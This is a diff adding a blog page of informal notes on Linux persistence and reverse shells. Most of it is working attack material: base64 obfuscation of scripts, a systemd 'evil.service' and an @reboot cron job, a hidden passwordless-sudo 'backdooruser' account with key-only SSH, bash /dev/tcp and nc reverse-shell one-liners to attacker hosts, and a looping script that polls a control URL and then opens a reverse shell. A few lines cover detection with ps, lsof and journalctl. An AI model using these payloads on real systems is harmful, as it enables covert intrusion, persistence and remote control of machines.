@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Ridham's Blog</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <header class="site-header">
+    <div class="container">
+      <h1 class="site-title">
+        <a href="/">AWS</a>
+      </h1>    
+        <nav class="site-nav">
+        
+          <a href="/">Home</a>
+        
+          <a href="/posts/">Posts</a>
+        
+          <a href="/thoughts/">Thoughts</a>
+        
+          <a href="/notes/">Notes</a>
+        
+      </nav>
+    </div>
+  </header>
+  <main class="container">
+    <article class="post">
+      <p>obsfucation :</p>
+<p>origin is the actual script </p>
+<pre class="codehilite"><code>echo &quot;echo $(base64 origin)&quot; &gt; obsf
+chmod +x obsf
+</code></pre>
+
+<p>Running it </p>
+<pre class="codehilite"><code>sh obsf | base64 -d | sh
+</code></pre>
+
+<h3>Abusing Remote Access Without a Visible Session</h3>
+<p><code>ssh user@host 'sudo apt install backdoor &amp;&amp; systemctl enable backdoor'</code> </p>
+<p>you can catch it from </p>
+<p><code>journalctl -u ssh</code></p>
+<h3>Dropping a systemd service</h3>
+<p>Example evil service </p>
+<p>open a reverse shell</p>
+<pre class="codehilite"><code># /etc/systemd/system/evil.service
+[Unit]
+Description=Evil Backdoor Service
+After=network.target
+
+[Service]
+ExecStart=/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1'
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+
+<h3>cron stuff</h3>
+<pre class="codehilite"><code>@reboot root /usr/bin/evil_payload
+</code></pre>
+
+<h2>Shell stuff</h2>
+<h3>Reverse shell</h3>
+<h4>how do you find a shell ?</h4>
+<p>Use ps to look for shells with no tty </p>
+<p><code>ps -eo pid,user,tty,cmd | grep '[b]ash'</code></p>
+<p>Then check the parent process with </p>
+<p><code>pstree -p &lt;PID&gt;</code></p>
+<p>you can also use </p>
+<p><code>ps aux | grep bash</code></p>
+<p>*** Ussing lsof to see established connections  :- ***</p>
+<p><code>sudo lsof -i -nP | grep ESTABLISHED</code></p>
+<p>Start a shell </p>
+<pre class="codehilite"><code>bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1
+</code></pre>
+
+<h4>Disable root login</h4>
+<p><code>PermitRootLogin no</code></p>
+<h4>starting a reverse shell</h4>
+<ul>
+<li>we need to create an account first that only uses keys</li>
+</ul>
+<p>Name it something like *** sysuser *** </p>
+<pre class="codehilite"><code>sudo adduser backdooruser
+sudo usermod -aG sudo backdooruser
+
+sudo visudo
+backdooruser ALL=(ALL) NOPASSWD:ALL
+</code></pre>
+
+<p>NOPASSWD helpful for running sudo commands without sudo being prompted </p>
+<ul>
+<li>setup ssh login </li>
+</ul>
+<pre class="codehilite"><code>ssh-keygen -t rsa -b 4096
+
+sudo su - backdooruser
+mkdir -p ~/.ssh
+nano ~/.ssh/authorized_keys 
+</code></pre>
+
+<p>and paste your public key </p>
+<p>expected permissions </p>
+<pre class="codehilite"><code>chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+</code></pre>
+
+<ul>
+<li>Disable password login</li>
+</ul>
+<pre class="codehilite"><code>sudo nano /etc/ssh/sshd_config
+Match User backdooruser
+    PasswordAuthentication no
+    AuthenticationMethods publickey
+</code></pre>
+
+<p>then </p>
+<p><code>sudo systemctl restart sshd</code></p>
+<ul>
+<li>2 ways to do a revshell </li>
+</ul>
+<pre class="codehilite"><code>bash -i &gt;&amp; /dev/tcp/attacker-ip/4242 0&gt;&amp;1
+nc ATTACKER_IP 4444 -e /bin/bash
+</code></pre>
+
+<p>prefer to use tcp so that you can disable nc </p>
+<pre class="codehilite"><code>#!/bin/bash
+URL=&quot;https://rasenrhino.github.io/static/reverse.html&quot;  # Control server
+SHELL_HOST=&quot;172.25.0.2&quot;                      # Replace with your attacker's IP
+SHELL_PORT=4242 # Port your listener is using
+# Loop to check the control server
+while true; do
+    response=$(curl -s &quot;$URL&quot;)
+    echo $response
+    if [[ &quot;$response&quot; == &quot;yes&quot; ]]; then
+        echo &quot;starting revshell&quot;
+        bash -i &gt;&amp; /dev/tcp/$SHELL_HOST/$SHELL_PORT 0&gt;&amp;1
+    fi
+    sleep 5
+done
+</code></pre>
+
+<p>to start a python webserver </p>
+<pre class="codehilite"><code>python3 -m http.server 8080
+</code></pre>
+    </article>
+    
+  </main>
+  <footer class="site-footer">
+    <div class="container">
+      <p>&copy; 2025 RasenRhino. No rights reserved </p>
+    </div>
+  </footer>
+</body>
+</html>
